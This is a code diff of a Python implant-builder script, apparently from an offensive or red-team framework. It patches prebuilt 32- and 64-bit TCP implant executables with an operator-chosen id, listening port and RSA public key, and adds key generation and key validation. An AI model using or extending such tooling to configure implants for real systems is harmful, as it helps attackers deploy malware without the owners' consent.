@@ -39,27 +39,28 @@ def main(args):
     eh.ui.Echo("Available payloads:", eh.ECHO_DEFAULT)
     for id, key in implant_types.items():
         eh.ui.Echo("    {}) - {}".format(id, key), eh.ECHO_DEFAULT)
+
     while True:
-        type = int(eh.ui.Dialog("Pick payload type:"))
-        if (type in implant_types.keys()):
+        implant_type = eh.ui.Dialog("Pick payload type:", type=eh.INT)
+        if implant_type in implant_types.keys():
             break
         eh.ui.Echo("Invalid option", eh.ECHO_ERROR)
     
-    if type == 1:
+    if implant_type == 1:
         patch(os.path.join(FILEDIR, "X32_ClSp_Tcp_Exe.exe"))
-    elif type == 2:
+    elif implant_type == 2:
         patch(os.path.join(FILEDIR, "X64_ClSp_Tcp_Exe.exe"))
-    elif type == 3:
+    elif implant_type == 3:
         not_implemented()
-    elif type == 4:
+    elif implant_type == 4:
         not_implemented()
-    elif type == 5:
+    elif implant_type == 5:
         not_implemented()
-    elif type == 6:
+    elif implant_type == 6:
         not_implemented()
-    elif type == 7:
+    elif implant_type == 7:
         not_implemented()
-    elif type == 8:
+    elif implant_type == 8:
         not_implemented()
         
 def not_implemented():
@@ -68,26 +69,24 @@ def not_implemented():
     
 def patch(name):
     
+    id = eh.ui.Dialog("Enter the implant id", type=eh.INT, default=0)
+    port = eh.ui.Dialog("Enter the implant listening port",  type=eh.INT, default=1287)
+
     while True:
-        try:
-            id = int(eh.ui.Dialog("Enter the implant id"))
-            break
-        except ValueError:
-            eh.ui.Echo("Invalid int input", eh.ECHO_ERROR)
-    
-    while True:
-        try:
-            port = int(eh.ui.Dialog("Enter the implant listening port"))
-            break
-        except ValueError:
-            eh.ui.Echo("Invalid int input", eh.ECHO_ERROR)
-        
-    while True:    
-        key_path = eh.ui.Dialog("Enter RSA2048 publickey path")
+        if eh.ui.Option("Do you want to generate a new RSA keypair?", default=eh.OPTION_YES) == eh.OPTION_YES:
+            key_path = eh.ui.Dialog("Enter the path to save the keypair")
+            eh.ui.Run("!keygen " + key_path, eh.RUN_SILENT)
+            key_path = os.path.join(key_path, "public.key")
+        else:
+            key_path = eh.ui.Dialog("Enter RSA2048 publickey path")
+
         try:
             with open(key_path, "rb") as f:
-                public_key = f.read()[::-1]
-                break
+                public_key = f.read()
+                if public_key[0:4] == RSA_MAGIC.to_bytes(eh.LONG, "big"):
+                    break
+                else:
+                    eh.ui.Echo("Invalid RSA publickey file", eh.ECHO_ERROR)
         except IOError:
             eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
         
@@ -114,7 +113,7 @@ def patch(name):
     if rsa_magic_val > 0:
         rsa_publickey = eh.data.Struct(RSA_KEY)
         rsa_publickey.from_bytes(config.full_data(), global_offset=rsa_magic_val)
-        rsa_publickey.public_key = public_key
+        rsa_publickey.public_key = public_key[::-1]
         try:
             dt = datetime.datetime.now()
             current_time = dt.strftime("%Y_%m_%d_%Hh%Mm%Ss")
